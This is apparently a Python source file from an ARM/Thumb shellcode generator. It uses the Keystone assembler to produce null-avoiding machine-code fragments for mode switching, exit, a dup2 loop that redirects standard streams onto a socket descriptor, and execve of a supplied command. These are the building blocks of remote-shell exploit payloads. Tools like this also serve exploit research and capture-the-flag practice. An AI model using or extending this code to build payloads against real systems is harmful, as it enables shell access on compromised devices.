#!/usr/bin/env python

import os
from thumb import thumb_syscall

from constance import *

try:
    from keystone import *
except ImportError:
    print "keystone is key module for %s" % sys.argv[0]
    sys.exit(-1)

def ks_asm(arch, CODE):
    _arch = ''
    _mode = ''

    if arch == 'arm':
        _arch = KS_ARCH_ARM
        _mode = KS_MODE_ARM
    elif arch == 'thumb':
        _arch = KS_ARCH_ARM
        _mode = KS_MODE_THUMB
    else:
        _arch = KS_ARCH_ARM64
        _mode = KS_MODE_LITTLE_ENDIAN

    ks = Ks(_arch, _mode)
    data, count = ks.asm(CODE)

    return ''.join(map(chr, data)), count

class THUMB:
    arch = 'thumb'
    syscall = -1

    def thumb_fixup(self, reg, value):
	if value <= 255:
	    return "mov %s, #%s" % (reg, value)

	fn = []
	fn.append('sub %s, %s, %s' % (reg, reg, reg))
	mod = value % 255
	div = value / 255

	for v in range(0, div):
	    fn.append('add %s, %s, #255' % (reg, reg))
	fn.append('add %s, %s, #%s' % (reg, reg, mod))

	return '; '.join(fn)

    def __init__(self):
        pass

    def arm_to_thumb(self, sock=4):
        data  = ''
        data += b'add r6, pc, #1 ;'
        data += b'bx r6 ;'
        self.arch = 'arm'
        sc, count = ks_asm(self.arch, data)
        self.arch = 'thumb'
        return sc

    def exit(self):
        self.syscall = thumb_syscall.get_syscall('exit')
        data  = ''
        data += b'subs r0, r0, r0 ;'
        data += b'movs r7, #' + str(self.syscall) + ' ;'
        data += b'svc #1          ;'
        sc, count = ks_asm(self.arch, data)
        return sc

    def dup2(self, sock=4):
        self.syscall = thumb_syscall.get_syscall('dup2')
        data  = ''
        data += b'movs r1, #3     ;'
        data += b'movs r7, #' + str(self.syscall) + ' ;'
        data += b'subs r2, r2, r2 ;'
        data += b'movs r5, #' + str(sock) + ' ;'
        data += b'loop_1:         ;'
        data += b'movs r0, r5     ;'
        data += b'subs r1, r1, #1 ;'
        data += b'svc #1          ;'
        data += b'cmp r1, r2      ;'
        data += b'bne loop_1      ;'
        sc, count = ks_asm(self.arch, data)
        return sc

    def execve(self, *args):
        self.syscall = thumb_syscall.get_syscall('execve')
        if len(args) == 1:
            data  = ''
            data += b'mov r0, pc      ;' 
            data += b'adds r0, #11    ;'
            data += b'adds r0, r0, #1 ;'
            data += b'subs r2, r2, r2 ;'
            data += b'movs r7, #' + str(self.syscall) + ' ;'
            data += b'push {r0, r2}   ;'
            data += b'mov  r1, sp     ;'
            data += b'svc  1          ;'
            data += b'.asciz "{0}"'.format(args[0])
            sc, count = ks_asm(self.arch, data)
            return sc
        else:
            raise "Not implement yet"
